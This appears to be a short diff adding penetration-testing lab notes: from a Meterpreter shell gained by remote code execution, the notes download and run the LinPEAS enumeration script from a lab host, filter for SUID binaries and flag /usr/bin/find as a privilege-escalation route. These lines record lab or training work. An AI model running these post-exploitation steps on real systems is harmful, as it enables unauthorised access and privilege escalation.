@@ -1,0 +1,8 @@
+# From Meterpreter shell (after Lab 1 RCE):
+shell
+wget http://192.168.1.10/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | grep -i suid
+
+# LinPEAS Output (highlighted):
+SUID - /usr/bin/find (common GTFOBins exploit)
